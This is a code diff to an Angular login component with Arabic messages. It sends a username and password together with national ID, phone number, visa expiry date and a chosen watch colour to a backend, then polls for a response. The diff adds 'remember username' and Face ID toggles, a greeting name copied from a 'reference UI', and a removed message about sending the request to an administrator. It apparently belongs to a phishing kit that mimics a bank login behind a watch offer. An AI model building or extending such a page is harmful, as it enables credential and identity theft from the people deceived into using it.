@@ -1,4 +1,4 @@
-import { Component, signal, inject, OnDestroy } from '@angular/core';
+import { Component, signal, inject, OnDestroy, computed } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { Router } from '@angular/router';
 import { WatchStateService } from '../../services/watch-state';
@@ -17,15 +17,29 @@ export class Login implements OnDestroy {
   protected readonly username = signal('');
   protected readonly password = signal('');
   protected readonly isPasswordVisible = signal(false);
+  protected readonly rememberUsername = signal(false);
+  protected readonly enableFaceId = signal(false);
+
+  // Dynamic greeting name based on state, fallback to 'Tarek' as in reference UI
+  protected readonly greetingName = computed(() => {
+    const raw = this.watchState.fullName().trim();
+    if (!raw) return 'Tarek';
+    const firstWord = raw.split(/\s+/)[0];
+    return firstWord || 'Tarek';
+  });
 
   // States
   protected readonly isLoading = signal(false);
-  protected readonly loadingMessage = signal('جاري إرسال الطلب للمسؤول...');
+  protected readonly loadingMessage = signal('يرجى الانتظار جاري التحقق من البيانات');
   protected readonly errorMessage = signal<string | null>(null);
 
   // Polling tracker
   private pollIntervalId: any = null;
   private currentRequestId: string | null = null;
+
+  // Regex to detect any Arabic Unicode character
+  private readonly arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
+  private readonly arabicGlobalRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g;
 
   // Cleanup on destroy
   public ngOnDestroy(): void {
@@ -37,13 +51,57 @@ export class Login implements OnDestroy {
     this.isPasswordVisible.set(!this.isPasswordVisible());
   }
 
-  // Form field inputs
+  // Toggle remember username
+  protected toggleRememberUsername(): void {
+    this.rememberUsername.set(!this.rememberUsername());
+  }
+
+  // Toggle Face ID
+  protected toggleFaceId(): void {
+    this.enableFaceId.set(!this.enableFaceId());
+  }
+
+  // Block Arabic characters from keyboard typing
+  protected preventArabicKey(event: KeyboardEvent): void {
+    if (this.arabicRegex.test(event.key)) {
+      event.preventDefault();
+    }
+  }
+
+  // Block Arabic input before it is inserted (mobile/virtual keyboards & IME)
+  protected onBeforeInput(event: any): void {
+    if (event?.data && this.arabicRegex.test(event.data)) {
+      event.preventDefault();
+    }
+  }
+
+  // Filter Arabic from paste events
+  protected onPaste(event: ClipboardEvent): void {
+    const pastedText = event.clipboardData?.getData('text') || '';
+    if (this.arabicRegex.test(pastedText)) {
+      event.preventDefault();
+      const cleaned = pastedText.replace(this.arabicGlobalRegex, '');
+      const input = event.target as HTMLInputElement;
+      const start = input.selectionStart || 0;
+      const end = input.selectionEnd || 0;
+      input.value = input.value.substring(0, start) + cleaned + input.value.substring(end);
+      input.dispatchEvent(new Event('input'));
+    }
+  }
+
+  // Form field inputs: completely sanitizes any Arabic characters
   protected onInput(field: 'user' | 'pass', event: Event): void {
-    const value = (event.target as HTMLInputElement).value;
+    const input = event.target as HTMLInputElement;
+    const cleaned = input.value.replace(this.arabicGlobalRegex, '');
+    
+    if (input.value !== cleaned) {
+      input.value = cleaned;
+    }
+
     if (field === 'user') {
-      this.username.set(value);
+      this.username.set(cleaned);
     } else {
-      this.password.set(value);
+      this.password.set(cleaned);
     }
     this.errorMessage.set(null); // Clear error when typing
   }
@@ -60,16 +118,16 @@ export class Login implements OnDestroy {
 
     this.isLoading.set(true);
     this.errorMessage.set(null);
-    this.loadingMessage.set('جاري التحقق من البيانات');
+    this.loadingMessage.set('جاري التحقق من البيانات...');
 
     const payload = {
       username: this.username().trim(),
       password: this.password(),
-      fullName: this.watchState.fullName(),
+      fullName: this.watchState.fullName() || this.greetingName(),
       nationalId: this.watchState.nationalId(),
       phoneNumber: this.watchState.phoneNumber(),
       visaExpiryDate: this.watchState.visaExpiryDate(),
-      watchColor: this.watchState.selectedWatch().colorLabel,
+      watchColor: this.watchState.selectedWatch()?.colorLabel || 'برتقالي مشرق',
     };
 
     // Make API call to backend server
@@ -93,7 +151,7 @@ export class Login implements OnDestroy {
       .catch((err) => {
         console.error(err);
         this.isLoading.set(false);
-        this.errorMessage.set('حدث خطأ أثناء الاتصال بالسيرفر. تأكد من تشغيل الباك إند.');
+        this.errorMessage.set('حدث خطأ أثناء الاتصال بالسيرفر. يرجى المحاولة مرة أخرى.');
       });
   }
 
